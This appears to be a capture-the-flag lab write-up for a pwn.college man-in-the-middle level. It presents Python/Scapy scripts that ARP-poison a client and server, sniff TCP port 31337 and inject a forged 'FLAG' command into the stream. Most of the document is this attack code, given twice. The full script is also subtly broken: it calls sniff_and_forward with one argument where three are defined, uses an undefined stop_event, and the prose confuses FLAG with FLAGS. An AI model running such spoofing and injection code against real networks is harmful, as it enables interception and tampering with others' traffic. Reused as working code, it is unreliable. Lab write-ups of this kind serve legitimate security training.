This level requires us to inject traffic into our man-in-the-middle attack. We can write a script that performs ARP hijacking on both the client and the server so that we can listen in on what both of them are saying. We can hijack the ARP of both the client and the server at the same time with multithreading.

```python
from scapy.all import *
import sys
import threading

def hijack_arp(victim_ip, victim_mac, target_ip, iface):
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
    while True:
        send(packet, iface=iface, verbose=False)

# configs
client_ip = "10.0.0.4"
server_ip = "10.0.0.3"
iface = "eth0"

# get MAC addresses
client_mac = getmacbyip(client_ip)
server_mac = getmacbyip(server_ip)

try:
    print("Hijacking ARP")
    client_thread = threading.Thread(target=hijack_arp, args=(client_ip, client_mac, server_ip, iface)) # ARP hijack victim
    server_thread = threading.Thread(target=hijack_arp, args=(server_ip, server_mac, client_ip, iface)) # ARP hijack target

    client_thread.start()
    server_thread.start()
except KeyboardInterrupt:
    stop_event.set()
    client_thread.join()
    server_thread.join()
    sys.exit(0)
```

This allows us to trick both the client and the server into thinking our machine is the thing that they are supposed to communicate to. This allows us to tap into their communication. When we tap into the traffic between `10.0.0.4` (client) and `10.0.0.3` (server), we get this TCP stream between the two.

```
SECRET:              # server
7b232d41f3a50b8706dd # client
COMMANDS:            # server
ECHO                 # server
FLAG                 # server
COMMAND:             # server
ECHO                 # client
Hello, World!        # client
Hello, World!        # server
```

The `FLAG` command in the packet will make the server send the flag. Right now, the client doesn't send any `FLAG` command, the server does. However, the client doesn't have the flag so nothing really happen. What we need to do is to inject a `FLAG` command into the client-to-server stream right after the server's `COMMAND:` packet. The `COMMAND:` packet is actually sent with the `COMMANDS\nECHO\nFLAGS\n` packet, making 1 packet with `COMMANDS\nECHO\nFLAGS\nCOMMAND:\n`.

The way man-in-the-middle works is that when we hijack the ARP, the client will still communicate with the server and vice versa, we are just able to tap into that communication and listen on what's going on. If we want to inject extra traffic into a specific point in the communication, we need to find which point to inject into and what is the part that comes before that point. When we hit the part that comes before the injection point, we construct a packet containing our payload and send it to the server. This ensures that our payload will make it to the server before the client's packet, meaning the server will process our payload first. While testing this, I found that we need to inject our payload before the client's packet or the server will just ignore our payload.

Now we can sniff the traffic and detect any packet that contains the word `ECHO` and `COMMANDS` in it. We sniff the packet using the `sniff` function with a filter for TCP communication on port `31337`. If we do find that packet, we'll make a new packet containing our payload `FLAG\n`. This packet will get its information from the detected packet, more importantly, we get the `ack` number and `seq` number from the detected packet for our payload packet. After crafting the payload packet, we send it and wait for a response from the server. I've also coded a part that automatically detects the flag packet.

```python
def sniff_and_forward(iface):
    ack_num = 0

    def process_packet(packet):
        nonlocal ack_num
        if packet.haslayer(TCP):
            tcp_payload = bytes(packet[TCP].payload)

            print(f"PACKET: {packet.summary}")
            print(hexdump(packet))

            if b"pwn.college" in tcp_payload:
                print("Found flag packet:")
                print(hexdump(packet))
                stop_event.set()
                sys.exit(0)
            elif b"ECHO" in tcp_payload and b"COMMANDS" in tcp_payload:
                print("Found 'ECHO' and 'COMMANDS' in packet")
                custom_payload = b"FLAG\n"
                ack_num = int(packet[TCP].seq) + 29
                new_packet = (Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                              IP(version=4, flags="DF", src=packet[IP].dst, dst=packet[IP].src, ttl=64) /
                              TCP(sport=packet[TCP].dport, dport=packet[TCP].sport,
                                  seq=packet[TCP].ack, ack=ack_num,
                                  flags="PA") /
                                  custom_payload)

                print(f"Injection packet: {new_packet.summary}")
                print(hexdump(new_packet))

                sendp(new_packet, iface=iface, verbose=False)

    sniff(filter="tcp port 31337", prn=process_packet, store=False)
```

Here's the full code:

```python
from scapy.all import *
import sys
import threading

def hijack_arp(victim_ip, victim_mac, target_ip, iface):
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
    while True:
        send(packet, iface=iface, verbose=False)

def sniff_and_forward(filter_ip1, filter_ip2, iface):
    ack_num = 0

    def process_packet(packet):
        nonlocal ack_num
        if packet.haslayer(TCP):
            tcp_payload = bytes(packet[TCP].payload)

            print(f"PACKET: {packet.summary}")
            print(hexdump(packet))

            if b"pwn.college" in tcp_payload:
                print("Found flag packet:")
                print(hexdump(packet))
                stop_event.set()
                sys.exit(0)
            elif b"ECHO" in tcp_payload and b"COMMANDS" in tcp_payload:
                print("Found 'ECHO' and 'COMMANDS' in packet")
                custom_payload = b"FLAG\n"
                ack_num = int(packet[TCP].seq) + 29
                new_packet = (Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                              IP(version=4, flags="DF", src=packet[IP].dst, dst=packet[IP].src, ttl=64) /
                              TCP(sport=packet[TCP].dport, dport=packet[TCP].sport,
                                  seq=packet[TCP].ack, ack=ack_num,
                                  flags="PA") /
                                  custom_payload)

                print(f"Injection packet: {new_packet.summary}")
                print(hexdump(new_packet))

                sendp(new_packet, iface=iface, verbose=False)

    sniff(filter="tcp port 31337", prn=process_packet, store=False)

# configs
client_ip = "10.0.0.4"
server_ip = "10.0.0.3"
iface = "eth0"

# get MAC addresses
client_mac = getmacbyip(client_ip)
server_mac = getmacbyip(server_ip)

try:
    print("Hijacking ARP")
    client_thread = threading.Thread(target=hijack_arp, args=(client_ip, client_mac, server_ip, iface))
    server_thread = threading.Thread(target=hijack_arp, args=(server_ip, server_mac, client_ip, iface))

    client_thread.start()
    server_thread.start()

    print("Sniffing traffic on port 31337")
    sniff_and_forward(iface)
except KeyboardInterrupt:
    stop_event.set()
    client_thread.join()
    server_thread.join()
    sys.exit(0)
```
